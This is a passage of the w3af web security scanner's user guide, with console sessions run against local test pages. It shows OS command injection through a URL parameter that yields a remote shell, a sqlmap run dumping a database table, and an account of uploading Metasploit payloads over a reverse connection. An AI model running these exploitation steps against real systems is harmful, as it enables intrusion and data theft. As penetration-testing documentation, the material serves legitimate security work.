<P STYLE="font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">==========Request
4 - Sun Sep 14 17:36:12 2008============== </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">GET
http://localhost/w3af/osCommanding/vulnerable.php?command=+ping+-c+4+localhost
HTTP/1.1 </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Host:
localhost </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Accept-encoding:
identity </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Accept:
*/* </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">User-agent:
w3af.sourceforge.net </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">==========Response
4 - Sun Sep 14 17:36:12 2008============== </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">HTTP/1.1
200 OK </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">date:
Sun, 14 Sep 2008 20:36:09 GMT </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">transfer-encoding:
chunked </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">x-powered-by:
PHP/5.2.4-2ubuntu5.3 </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">content-type:
text/html </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">server:
Apache/2.2.8 (Ubuntu) mod_python/3.3.1 Python/2.5.2
PHP/5.2.4-2ubuntu5.3 with Suhosin-Patch </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">PING
localhost (127.0.0.1) 56(84) bytes of data. </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">64
bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.024 ms </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">64
bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.035 ms </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">64
bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64 time=0.037 ms </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">64
bytes from localhost (127.0.0.1): icmp_seq=4 ttl=64 time=0.037 ms </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">---
localhost ping statistics --- </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">4
packets transmitted, 4 received, 0% packet loss, time 2999ms </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">rtt
min/avg/max/mdev = 0.024/0.033/0.037/0.006 ms </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">=============================================================</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><BR><BR>
</P>
<P ALIGN=JUSTIFY STYLE="font-weight: medium"><FONT FACE="Bitstream Vera Sans, sans-serif">All
messages sent by the plugins and the framework are sent to ALL
enabled plugins, so if you have enabled textFile and htmlFile output
plugins, both will log a vulnerability found by an audit plugin.</FONT></P>
<P STYLE="font-weight: medium"><BR><BR>
</P>
<H2 CLASS="western">Complex sites</H2>
<P><BR><BR>
</P>
<P ALIGN=JUSTIFY>Some sites use embedded objects, like Macromedia
Flash and Java applets, that the browser renders to the user. Because
of the inability of the framework to get any information out of those
objects, a script called spiderMan was created. This script will run
a HTTP proxy so the user can navigate the target site through it;
during this process the plugin will extract information from the
requests and responses.</P>
<P ALIGN=JUSTIFY>A simple example will clarify things, let's suppose
that w3af is auditing a site and can't find any links on the main
page. After a closer interpretation of the results by the user, it is
clear that the main page has a Java applet menu where all the other
sections are linked. The user runs w3af once again and now activates
the spiderMan plugin, navigates the site manually using the browser
and the spiderman proxy. When the user has finished his browsing,
w3af will continue with all the hard auditing work.</P>
<P ALIGN=JUSTIFY>The spiderMan plugin can be used when Javascript,
Flash, Java applets or any other browser side technology is present.</P>
<P>This is a sample spiderMan plugin run:</P>
<P><BR><BR>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
plugins</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
discovery spiderMan</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
back</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
target</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/target&gt;&gt;&gt;</B>
set target http://localhost/w3af/fileUpload/</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/target&gt;&gt;&gt;</B>
back</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
start</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">spiderMan
proxy is running on 127.0.0.1:44444 . </FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Please
configure your browser to use these proxy settings and navigate the
target site. To exit spiderMan plugin please navigate to
http://127.7.7.7/spiderMan?terminate . </FONT>
</P>
<P STYLE="margin-left: 0.49in"><BR><BR>
</P>
<P ALIGN=JUSTIFY>Now the user configures the browser to use the
127.0.0.1:44444 proxy and navigates the target site, after that he
navigates to <FONT FACE="Bitstream Vera Sans, sans-serif">“http://127.7.7.7/spiderMan?terminate”</FONT>
and exits the spiderMan. The results are shown:</P>
<P STYLE="margin-left: 0.49in"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">New
URL found by discovery: http://localhost/w3af/test</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">New
URL found by discovery: http://localhost/favicon.ico</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">New
URL found by discovery: http://localhost/w3af/</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">New
URL found by discovery: http://localhost/w3af/img/w3af.png</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">New
URL found by discovery:
http://localhost/w3af/xss-forms/test-forms.html</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">New
URL found by discovery:
http://localhost/w3af/xss-forms/dataReceptor.php</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">The
list of found URLs is:</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
http://localhost/w3af/fileUpload/</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
http://localhost/w3af/test</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
http://localhost/w3af/xss-forms/dataReceptor.php</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
http://localhost/w3af/</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
http://localhost/w3af/img/w3af.png</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
http://localhost/w3af/xss-forms/test-forms.html</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
http://localhost/w3af/fileUpload/uploader.php</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
http://localhost/favicon.ico</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Found
8 URLs and 8 different points of injection.</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">The
list of Fuzzable requests is:</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
http://localhost/w3af/fileUpload/ | Method: GET</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
http://localhost/w3af/fileUpload/uploader.php | Method: POST |
Parameters: (MAX_FILE_SIZE,uploadedfile)</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
http://localhost/w3af/test | Method: GET</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
http://localhost/favicon.ico | Method: GET</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
http://localhost/w3af/ | Method: GET</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
http://localhost/w3af/img/w3af.png | Method: GET</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
http://localhost/w3af/xss-forms/test-forms.html | Method: GET</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
http://localhost/w3af/xss-forms/dataReceptor.php | Method: POST |
Parameters: (user,firstname)</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Starting
sqli plugin execution.</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B></FONT></P>
<H2 CLASS="western">Exploiting</H2>
<P><BR><BR>
</P>
<P ALIGN=JUSTIFY>Two ways of exploiting a vulnerability exist, the
first one uses the vulnerabilities found by the audit phase and the
second one, which is called fastextploit, requires the user to enter
the vulnerability parameters.</P>
<P ALIGN=JUSTIFY><BR><BR>
</P>
<P ALIGN=JUSTIFY>Let's see an example of the first way of exploiting
a vulnerability with w3af:</P>
<P ALIGN=JUSTIFY STYLE="font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">plugins
</SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">audit
osCommanding </SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">back
</SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">target
</SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/config:target&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">set
target
http://localhost/w3af/osCommanding/vulnerable.php?command=f0as9 </SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/config:target&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">back
</SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">start
</SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Found
1 URLs and 1 different points of injection. </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">The
list of URLs is: </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">-
http://localhost/w3af/osCommanding/vulnerable.php </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">The
list of fuzzable requests is: </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">-
http://localhost/w3af/osCommanding/vulnerable.php | Method: GET |
Parameters: (command) </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Starting
osCommanding plugin execution. </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">OS
Commanding was found at:
&quot;http://localhost/w3af/osCommanding/vulnerable.php&quot;, using
HTTP method GET. The sent data was: &quot;command=+ping+-c+9+localhost&quot;.
The vulnerability was found in the request with id 5. </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Finished
scanning process. </FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">exploit
</SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">exploit
osCommandingShell </SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">osCommandingShell
exploit plugin is starting. </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">The
vulnerability was found using method GET, tried to change the method
to POST for exploiting but failed. </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Vulnerability
successfully exploited. This is a list of available shells: </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">-
[0] &lt;osCommandingShell object (ruser: &quot;www-data&quot; |
rsystem: &quot;Linux brick 2.6.24-19-generic i686 GNU/Linux&quot;)&gt;
</FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Please
use the interact command to interact with the shell objects. </FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">interact
0 </SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Execute
&quot;endInteraction&quot; to get out of the remote shell. Commands
typed in this menu will be runned on the remote web server. </FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit/osCommandingShell-0&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">ls
</SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">vulnerable.php
</FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">vulnerable2.php
</FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">w3afAgentClient.log
</FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit/osCommandingShell-0&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">endInteraction
</SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">back
</SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B></FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><BR><BR>
</P>
<P ALIGN=JUSTIFY>The second way is to use fastexploit. This method
should be used when the user has found a vulnerability manually and
wants to exploit it using the framework. Here is an example of a
fastexploit run:</P>
<P ALIGN=JUSTIFY><BR><BR>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
exploit</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit&gt;&gt;&gt;</B>
exploit config sqlmap</FONT></P>
<P ALIGN=LEFT STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugin/sqlmap&gt;&gt;&gt;
</B>set url http://localhost/w3af/blindSqli/blindSqli-integer.php</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugin/sqlmap&gt;&gt;&gt;</B>
set injvar id</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugin/sqlmap&gt;&gt;&gt;</B>
set data id=1</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugin/sqlmap&gt;&gt;&gt;</B>
back</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit&gt;&gt;&gt;</B>
fastexploit sqlmap</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">sqlmap
coded by inquis &lt;bernardo.damele@gmail.com&gt; and belch
&lt;daniele.bellucci@gmail.com&gt;</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">SQL
injection could be verified, trying to create the DB driver.</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Execute
&quot;exitPlugin&quot; to get out of the remote shell. Commands typed
in this menu will be runned on the remote web server.</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit/sqlmap&gt;&gt;&gt;</B>
dump agenda w3af_test</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Database:
w3af_test</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Table:
agenda</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">[2
entries]</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">+---------------+----+--------+----------+-----------------+</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">|
direccion     | id | nombre | telefono | email           |</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">+---------------+----+--------+----------+-----------------+</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">|
direccion 123 | 1  | apr    | 52365786 | acho@c.com      |</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">|
direccion 333 | 2  | vico   | 47998123 | vTro@c.com      |</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">+---------------+----+--------+----------+-----------------+</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit/sqlmap&gt;&gt;&gt;</B></FONT></P>
<H3 CLASS="western">Advanced exploiting techniques</H3>
<P><BR><BR>
</P>
<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">The
framework implements two highly advanced exploiting techniques that
allow the user to keep escalating privileges into the remote network.
Both of this techniques are used once the framework is able to
execute remote operating system commands, this is the case of (for
example) osCommanding, remoteFileIncludeShell and davShell attack
plugins. These exploiting techniques are:</FONT></P>
<UL>
	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">Virtual
	daemon, allows you <FONT FACE="Bitstream Vera Sans, sans-serif">to
	use metasploit payloads to exploit the server that supports a
	vulnerable web application.</FONT></FONT></P>
	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">w3afAgent,
	which creates a tunnel between the compromised server and w3af, the
	allow the user to route TCP connections through the remote server.</FONT></P>
	<P ALIGN=JUSTIFY></P>
</UL>
<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">Both of
them are simple to use and configure using this guide. These features
are under heavy development and are under no means stable, use them
at your on risk.</FONT></P>
<P ALIGN=JUSTIFY><BR><BR>
</P>
<H3 CLASS="western" ALIGN=JUSTIFY STYLE="margin-top: 0in">Virtual
daemon</H3>
<P ALIGN=JUSTIFY><BR><BR>
</P>
<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">As said
before, this feature allows you to use metasploit payloads to exploit
the server that supports a vulnerable web application. To use this
feature you must have a working installation of the metasploit
framework version 3.0 or greater; you can get it for free at
<A HREF="http://www.metasploit.com/">www.metasploit.com</A> , the
installation and configuration of MSF is out of the scope of this
document.</FONT></P>
<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">To be
able to use the virtual daemon you will need to run the following
command in order to copy the w3af metasploit module into the MSF
directory:</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">./w3af_console
-i /home/jdoe/tools/msf/</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><BR><BR>
</P>
<P ALIGN=JUSTIFY>Where “<FONT FACE="Nimbus Mono L, monospace">/home/jdoe/tools/msf/</FONT><FONT FACE="Bitstream Vera Sans, sans-serif">”
is the directory where the user “jdoe” installed Metasploit. I</FONT>n
case you are interested, this is just a fancy shortcut for “<FONT FACE="Nimbus Mono L, monospace">cp
</FONT><FONT FACE="Nimbus Mono L, monospace">core/controllers/vdaemon/w3af_vdaemon.rb
/home/user/tools/msf/modules/exploits/unix/misc/</FONT>”. Once this
has been done, the user can start using the virtual daemon feature,
before going through an example to see how to use the feature, we
will make a summary of the steps that will happened during the
exploitation:</P>
<OL>
	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">w3af
	finds a vulnerability that allows remote command execution</FONT></P>
	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">The
	user exploits the vulnerability and starts the virtual daemon</FONT></P>
	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">The
	user starts the metasploit framework</FONT></P>
	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">The
	user configures the w3af module inside MSF and executes it</FONT></P>
	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">w3af
	module inside MSF will connect to the virtual daemon that is
	listening on localhost</FONT></P>
	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">MSF
	will send the payload selected by the user to the virtual daemon</FONT></P>
	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">The
	virtual daemon will create a PE(portable executable) or an
	ELF(executable and linkable format) file depending on the remote
	operating system, and using the exploited vulnerability it will
	upload and execute the payload in the remote server</FONT></P>
	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">The
	process of uploading the file to the remote server depends on the
	remote operating system, the privileges of the user running w3af and
	the local operating system; but in most cases the following happens:</FONT></P>
</OL>
<UL>
	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">w3af
	sends a small executable to the remote server to perform an
	extrusion scan.</FONT></P>
	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">w3af
	sniffs on the configured interface ( misc-settings -&gt; interface )
	for packets that arrive on the expected ports in order to verify
	outgoing firewall rules on the remote network</FONT></P>
	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">If
	a TCP port is found to be allowed in the remote firewall, w3af will
	try </FONT><FONT FACE="Bitstream Vera Sans, sans-serif">to run a
	server on that port and make a reverse connection from the
	</FONT>compromised host in order to download the PE/ELF generated
	file.<FONT FACE="Bitstream Vera Sans, sans-serif"> If </FONT><FONT FACE="Bitstream Vera Sans, sans-serif">no
	TCP ports are enabled, w3af will send the ELF/PE file to the remote
	</FONT><FONT FACE="Bitstream Vera Sans, sans-serif">server using
	several calls to the “echo” command, which is rather slow, but
	should always work because it's an in-band transfer method.</FONT></P>
</UL>
<OL>
	<LI VALUE=1><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">The
	payload runs in the remote server and possibly connects back to the
	metasploit framework, that will handle the rest of the exploitation.</FONT></P>
</OL>
<OL>
	<P ALIGN=JUSTIFY></P>
</OL>
<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">Now
that we know the theory, let's see an example of what this feature
can do:</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>$</B>
./w3af_console </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
plugins </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
plugins </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
audit osCommanding </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
audit </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Enabled
audit plugins: </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">osCommanding
</FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
back </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
target </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/target&gt;&gt;&gt;</B>
set target http://172.16.1.128/os.php?cmd=f00 </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/target&gt;&gt;&gt;</B>
back </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
start </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">The
list of found URLs is: </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
http://172.16.1.128/os.php </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Found
1 URLs and 1 different points of injection. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">The
list of Fuzzable requests is: </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
http://172.16.1.128/os.php | Method: GET | Parameters: (cmd) </FONT>
</P>
